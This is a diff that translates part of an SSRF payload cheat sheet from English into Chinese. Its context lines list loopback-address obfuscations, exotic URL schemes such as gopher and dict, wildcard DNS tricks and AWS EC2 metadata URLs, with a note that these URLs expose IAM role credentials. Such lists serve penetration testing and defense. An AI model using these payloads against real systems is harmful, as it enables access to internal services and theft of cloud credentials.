@@ -16,9 +16,9 @@ http://127.000.000.1
 https://520968996
 ```
 
-_Note:_ The latter can be calculated using http://www.subnetmask.info/
+_提示:_ Ip段可被计算出，通过  http://www.subnetmask.info/
 
-**Exotic Handlers**
+**一些处理协议**
 
 ```
 gopher://, dict://, php://, jar://, tftp://
@@ -34,7 +34,7 @@ http://[::1]
 http://[::]
 ```
 
-**Wildcard DNS**
+**通配符 DNS**
 
 ```
 10.0.0.1.xip.io
@@ -54,7 +54,7 @@ otherapp.10.0.0.1.nip.io
 
 _Link:_ http://nip.io
 
-**AWS EC2 Metadata**
+**AWS EC2 元数据**
 
 ```
 http://169.254.169.254/latest/meta-data/  
@@ -68,6 +68,7 @@ http://169.254.169.254/latest/meta-data/local-hostname
 http://169.254.169.254/latest/meta-data/public-hostname
 ```
 
-> If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role [...]
+> 如果存在与实例关联的IAM角色，则role-name是该角色的名称，role-name包含与该角色关联的临时安全凭据[…]
 
-_Link:_ http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html (includes a comprehensive Instance Metadata Categories table)
+_Link:_ http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html (包含一个全面的实例元数据类别表)
+
